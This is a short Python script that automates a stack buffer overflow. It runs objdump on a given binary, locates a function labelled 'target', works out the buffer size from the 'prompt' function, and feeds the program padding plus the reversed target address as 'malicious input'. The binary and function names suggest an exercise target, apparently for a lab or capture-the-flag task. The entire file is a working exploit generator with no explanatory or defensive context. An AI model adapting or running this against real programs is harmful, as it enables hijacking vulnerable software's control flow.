#!/usr/bin/python3
from subprocess import call, run, PIPE, Popen
from sys import argv, exit
from os import remove

TMP_FILE = "/tmp/vuln_program.dump"

def create_obj_dump(exec_path):
	dump_file = open(TMP_FILE, "w")
	dump_proc = call(["objdump", "-D", exec_path], stdout=dump_file)
	dump_file.close()

def delete_obj_dump():
	remove(TMP_FILE)

def get_target_addr():
	cat_proc = Popen(["cat", TMP_FILE], stdout=PIPE)
	grep_proc = Popen(["grep", "<target>:"], stdin=cat_proc.stdout, stdout=PIPE)
	return grep_proc.communicate()[0].decode("utf-8").split(" ")[0]

def fix_target_addr(addr):
	if addr[0:2] == "0x":
		addr = addr[2:]
	elif addr[0:1] == "x":
		addr = addr[1:]
	elif len(addr) % 2 != 0:
		addr = "0" + addr
	return addr

def get_buffer_size():
	cat_proc = Popen(["cat", TMP_FILE], stdout=PIPE)
	grep_proc = Popen(["grep", "-n", "<prompt>:"], stdin=cat_proc.stdout, stdout=PIPE)

	# Sed reads at specific line
	start = int(grep_proc.communicate()[0].decode("utf-8").split(":")[0])
	start_str = "{}q;d".format(start+3)
	sed_proc = Popen(["sed", start_str, TMP_FILE], stdout=PIPE)	

	buff_size = sed_proc.communicate()[0].decode("utf-8")
	buff_size = buff_size.split("sub    $")[-1]
	buff_size = buff_size.split(",")[0]
	buff_size = int(buff_size, 16) - 0x8

	return buff_size

def call_exec(executable, input_buff):
	vuln_proc = run([executable], input=bytes(input_buff))

def main():
	create_obj_dump(argv[1])
	hex_input_addr = fix_target_addr(get_target_addr())
	a_buffer = "A" * get_buffer_size()
	delete_obj_dump()

	# Convert to byte pairs and reverse the order
	byte_pairs = ["".join(x) for x in zip(*[iter(hex_input_addr)]*2)][::-1]

	# Craft malicious input
	malicious_input = bytearray(a_buffer, 'utf-8') + bytearray.fromhex("".join(byte_pairs))

	# Call the exec passed in with malicious input
	call_exec(argv[1], malicious_input)

	# And we're done here!
	return
if __name__ == '__main__':
	main()
